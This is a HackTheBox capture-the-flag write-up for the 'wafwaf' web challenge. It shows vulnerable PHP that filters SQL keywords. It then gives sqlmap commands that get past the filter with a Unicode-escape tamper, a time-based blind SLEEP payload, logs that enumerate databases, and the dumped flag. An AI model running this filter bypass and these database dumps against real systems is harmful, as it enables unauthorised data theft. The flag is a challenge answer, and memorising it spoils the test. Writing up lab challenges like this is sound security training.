---
Category: Web
Difficulty: Easy
Platform: HackTheBox
Retired: true
Status: 3. Complete
Tags:
  - code-review
  - evasion
  - SQL-Injection
---
>[!quote]
>*My classmate Jason made this small and super secure note taking application, check it out!*


# Set up

-

# Information Gathering

Application code:

```php
<?php error_reporting(0);
require 'config.php';

class db extends Connection {
    public function waf($s) {
        if (preg_match_all('/'. implode('|', array(
            '[' . preg_quote("(*<=>|'&-@") . ']',
            'select', 'and', 'or', 'if', 'by', 'from', 
            'where', 'as', 'is', 'in', 'not', 'having'
        )) . '/i', $s, $matches)) die(var_dump($matches[0]));
        return json_decode($s);
    }

    public function query($sql) {
        $args = func_get_args();
        unset($args[0]);
        return parent::query(vsprintf($sql, $args));
    }
}

$db = new db();

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $obj = $db->waf(file_get_contents('php://input'));
    $db->query("SELECT note FROM notes WHERE assignee = '%s'", $obj->user);
} else {
    die(highlight_file(__FILE__, 1));
}
?>
```

# Exploitation

Payload:

```
POST / HTTP/1.1
Host: 159.65.95.35:31333
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
Content-Length: 49

{"user":"jason*"}
```

Sqlmap:

```bash
┌──(kali㉿kali)-[~/…/HTB/challenge/web/wafwaf]
└─$ sqlmap -r user.req --tamper charencode --level=5 --risk=3 --threads 10 --dbms=mysql --batch --technique=T
[*] starting @ 05:00:58 /2021-05-28/

[05:00:58] [INFO] parsing HTTP request from 'user.req'
[05:00:58] [INFO] loading tamper module 'charencode'
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
...
[05:02:18] [WARNING] (custom) POST parameter 'JSON #1*' does not seem to be injectable
[05:02:18] [CRITICAL] all tested parameters do not appear to be injectable. Rerun without providing the option '--technique'

[*] ending @ 05:02:18 /2021-05-28/

┌──(kali㉿kali)-[~/…/HTB/challenge/web/wafwaf]
└─$ sqlmap -r user.req --tamper charunicodeescape --level=5 --risk=3 --threads 10 --dbms=mysql --batch --technique=T
[*] starting @ 05:04:28 /2021-05-28/

[05:04:28] [INFO] parsing HTTP request from 'user.req'
[05:04:28] [INFO] loading tamper module 'charunicodeescape'
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[05:04:28] [INFO] testing connection to the target URL
[05:04:29] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON #1*' might not be injectable
[05:04:29] [INFO] testing for SQL injection on (custom) POST parameter 'JSON #1*'
[05:04:29] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[05:04:29] [WARNING] time-based comparison requires larger statistical model, please wait........................... (done)
[05:04:42] [INFO] (custom) POST parameter 'JSON #1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[05:04:42] [INFO] checking if the injection point on (custom) POST parameter 'JSON #1*' is a false positive
(custom) POST parameter 'JSON #1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 64 HTTP(s) requests:
---
Parameter: JSON #1* ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"user":"jason' AND (SELECT 7361 FROM (SELECT(SLEEP(5)))KQtb)-- WZUM"}
---
[05:05:41] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[05:05:41] [INFO] the back-end DBMS is MySQL
[05:05:41] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
web application technology: Nginx
back-end DBMS: MySQL >= 5.0.12
[05:05:41] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/159.65.95.35'

[*] ending @ 05:05:41 /2021-05-28/
```

Dumping the DB:

```bash
┌──(kali㉿kali)-[~/…/HTB/challenge/web/wafwaf]
└─$ sqlmap -r user.req --tamper charunicodeescape --level=5 --risk=3 --threads 10 --dbms=mysql --batch --technique=T --dump-all
...
web application technology: Nginx
back-end DBMS: MySQL >= 5.0.0
...
[05:06:28] [INFO] retrieved: 5
[05:06:30] [INFO] retrieved: information_schema
[05:07:43] [INFO] retrieved: db_m8452
[05:08:18] [INFO] retrieved: mysql
[05:08:38] [INFO] retrieved: performance_schema
[05:09:47] [INFO] retrieved: sys
[05:10:01] [INFO] fetching tables for databases: 'db_m8452, information_schema, mysql, performance_schema, sys'
[05:10:01] [INFO] fetching number of tables for database 'db_m8452'
[05:10:01] [INFO] retrieved: 2
[05:10:03] [INFO] retrieved: definitely_not_a_flag
[05:11:40] [INFO] retrieved: notes
[05:12:05] [INFO] fetching number of tables for database 'mysql'
[05:12:05] [INFO] retrieved: 31
[05:12:11] [INFO] retrieved: columns_priv
[05:13:07] [INFO] retrieved: db
[05:13:16] [INFO] retrieved: engine_cost
[05:14:05] [INFO] retrieved: event
[05:14:23] [INFO] retrieved: func
[05:14:41] [INFO] retrieved: general_log
[05:15:28] [INFO] retrieved: gtid_executed
[05:16:19] [INFO] retrieved: help_category
[05:17:15] [INFO] retrieved: help_keyword
[05:17:51] [INFO] retrieved: help_relation
[05:18:28] [INFO] retrieved: help_topic
[05:18:56] [INFO] retrieved: innodb_index_stats
[05:20:18] [INFO] retrieved: innodb_table_stats
[05:21:13] [INFO] retrieved: ndb_binlog_index
[05:22:28] [INFO] retrieved: plugin
[05:23:00] [INFO] retrieved: proc
[05:23:15] [INFO] retrieved: procs_priv
[05:23:54] [INFO] retrieved: proxies_priv
[05:24:45] [INFO] retrieved: server_cost
[05:25:38] [INFO] retrieved: servers
[05:25:49] [INFO] retrieved: slave_master
...

┌──(kali㉿kali)-[~/…/HTB/challenge/web/wafwaf]
└─$ sqlmap -r user.req --tamper charunicodeescape --level=5 --risk=3 --threads 10 --dbms=mysql --batch --technique=T -D db_m8452 -T definitely_not_a_flag --dump
...
web application technology: Nginx
back-end DBMS: MySQL >= 5.0.0
[05:28:39] [INFO] fetching columns for table 'definitely_not_a_flag' in database 'db_m8452'
multi-threading is considered unsafe in time-based data retrieval. Are you sure of your choice (breaking warranty) [y/N] N
[05:28:39] [WARNING] time-based comparison requires larger statistical model, please wait............................. (done)
[05:28:41] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
1
[05:28:47] [INFO] retrieved: ^[[A
[05:28:57] [INFO] adjusting time delay to 1 second due to good response times
lag
[05:29:10] [INFO] fetching entries for table 'definitely_not_a_flag' in database 'db_m8452'
[05:29:10] [INFO] fetching number of entries for table 'definitely_not_a_flag' in database 'db_m8452'
[05:29:10] [INFO] retrieved: 1
[05:29:12] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
...
[1 entry]
+-----------------------------------+
| flag                              |
+-----------------------------------+
| HTB{w4f_w4fing_my_w4y_0utt4_h3r3} |
+-----------------------------------+
```

# Flag

>[!success]
>`HTB{w4f_w4fing_my_w4y_0utt4_h3r3}`